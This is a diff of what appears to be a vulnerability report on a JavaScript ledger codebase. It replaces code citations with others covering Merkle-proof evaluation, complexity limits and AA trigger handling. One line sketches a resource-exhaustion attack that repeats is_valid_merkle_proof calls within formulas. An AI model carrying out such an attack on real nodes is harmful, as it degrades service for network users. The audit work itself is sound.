+5. **MAX_COMPLEXITY Consideration**: While MAX_COMPLEXITY = 100 limits formula complexity [13](#0-12) , an attacker could craft a formula calling `is_valid_merkle_proof` multiple times, or target multiple AAs with separate units, multiplying the computational burden.
 
 ### Citations
 
-**File:** archiving.js (L46-52)
+**File:** formula/validation.js (L815-824)
 ```javascript
-function generateQueriesToVoidJoint(conn, unit, arrQueries, cb){
-	generateQueriesToUnspendOutputsSpentInArchivedUnit(conn, unit, arrQueries, function(){
-		// we keep witnesses, author addresses, and the unit itself
-		conn.addQuery(arrQueries, "DELETE FROM witness_list_hashes WHERE witness_list_unit=?", [unit]);
-		conn.addQuery(arrQueries, "DELETE FROM earned_headers_commission_recipients WHERE unit=?", [unit]);
-		conn.addQuery(arrQueries, "UPDATE unit_authors SET definition_chash=NULL WHERE unit=?", [unit]);
-		conn.addQuery(arrQueries, "DELETE FROM address_definition_changes WHERE unit=?", [unit]);
+			case 'is_valid_merkle_proof':
+				complexity++;
+				var element = arr[1];
+				var proof = arr[2];
+				evaluate(element, function (err) {
+					if (err)
+						return cb(err);
+					evaluate(proof, cb);
+				});
+				break;
 ```
 
-**File:** storage.js (L774-783)
+**File:** merkle.js (L84-96)
 ```javascript
-function readDefinitionAtMci(conn, definition_chash, max_mci, callbacks){
-	var sql = "SELECT definition FROM definitions CROSS JOIN unit_authors USING(definition_chash) CROSS JOIN units USING(unit) \n\
-		WHERE definition_chash=? AND is_stable=1 AND sequence='good' AND main_chain_index<=?";
-	var params = [definition_chash, max_mci];
-	conn.query(sql, params, function(rows){
-		if (rows.length === 0)
-			return callbacks.ifDefinitionNotFound(definition_chash);
-		callbacks.ifFound(JSON.parse(rows[0].definition));
-	});
+function verifyMerkleProof(element, proof){
+	var index = proof.index;
+	var the_other_sibling = hash(element);
+	for (var i=0; i<proof.siblings.length; i++){
+		// this also works for duplicated trailing nodes
+		if (index % 2 === 0)
+			the_other_sibling = hash(the_other_sibling + proof.siblings[i]);
+		else
+			the_other_sibling = hash(proof.siblings[i] + the_other_sibling);
+		index = Math.floor(index/2);
+	}
+	return (the_other_sibling === proof.root);
 }
 ```
 
-**File:** validation.js (L1022-1038)
+**File:** formula/evaluation.js (L1659-1667)
 ```javascript
-		storage.readDefinitionByAddress(conn, objAuthor.address, objValidationState.last_ball_mci, {
-			ifDefinitionNotFound: function(definition_chash){
-				storage.readAADefinition(conn, objAuthor.address, function (arrAADefinition) {
-					if (arrAADefinition)
-						return callback(createTransientError("will not validate unit signed by AA"));
-					findUnstableInitialDefinition(definition_chash, function (arrDefinition) {
-						if (!arrDefinition)
-							return callback("definition " + definition_chash + " bound to address " + objAuthor.address + " is not defined");
-						bInitialDefinition = true;
-						validateAuthentifiers(arrDefinition);
-					});
-				});
-			},
-			ifFound: function(arrAddressDefinition){
-				validateAuthentifiers(arrAddressDefinition);
-			}
-		});
+						if (proof instanceof wrappedObject)
+							objProof = proof.obj;
+						else if (typeof proof === 'string') {
+							if (proof.length > 1024)
+								return setFatalError("proof is too large", cb, false);
+							objProof = merkle.deserializeMerkleProof(proof);
+						}
+						else // can't be valid proof
+							return cb(false);
 ```
 
-**File:** validation.js (L1043-1071)
+**File:** validation.js (L1750-1753)
 ```javascript
-	function findUnstableInitialDefinition(definition_chash, handleUnstableInitialDefinition) {
-		if (objValidationState.last_ball_mci < constants.unstableInitialDefinitionUpgradeMci || definition_chash !== objAuthor.address)
-			return handleUnstableInitialDefinition(null);
-		conn.query("SELECT definition, main_chain_index, unit \n\
-			FROM definitions \n\
-			CROSS JOIN unit_authors USING(definition_chash) \n\
+		case "data":
+			if (typeof payload !== "object" || payload === null)
+				return callback(objMessage.app+" payload must be object");
+			return callback();
+```
+
+**File:** constants.js (L57-57)
+```javascript
+exports.MAX_COMPLEXITY = process.env.MAX_COMPLEXITY || 100;
+```
+
+**File:** constants.js (L58-58)
+```javascript
+exports.MAX_UNIT_LENGTH = process.env.MAX_UNIT_LENGTH || 5e6;
+```
+
+**File:** aa_composer.js (L57-66)
+```javascript
+	mutex.lock(['aa_triggers'], function (unlock) {
+		db.query(
+			"SELECT aa_triggers.mci, aa_triggers.unit, address, definition \n\
+			FROM aa_triggers \n\
 			CROSS JOIN units USING(unit) \n\
-			WHERE definition_chash=?",
-			[definition_chash],
+			CROSS JOIN aa_addresses USING(address) \n\
+			ORDER BY aa_triggers.mci, level, aa_triggers.unit, address",
 			function (rows) {
-				if (rows.length === 0)
-					return handleUnstableInitialDefinition(null);
-				if (rows.some(function (row) { return row.main_chain_index !== null && row.main_chain_index <= objValidationState.last_ball_mci })) // some are stable, maybe we returned to the initial definition
-					return handleUnstableInitialDefinition(null);
+				var arrPostedUnits = [];
 				async.eachSeries(
-					rows,
-					function (row, cb) {
-						graph.determineIfIncludedOrEqual(conn, row.unit, objUnit.parent_units, function (bIncluded) {
-							console.log("unstable definition of " + definition_chash + " found in " + row.unit + ", included? " + bIncluded);
-							bIncluded ? cb(JSON.parse(row.definition)) : cb();
-						});
-					},
-					function (arrDefinition) {
-						handleUnstableInitialDefinition(arrDefinition);
-					}
-				)
-			}
-		);
-	}
 ```
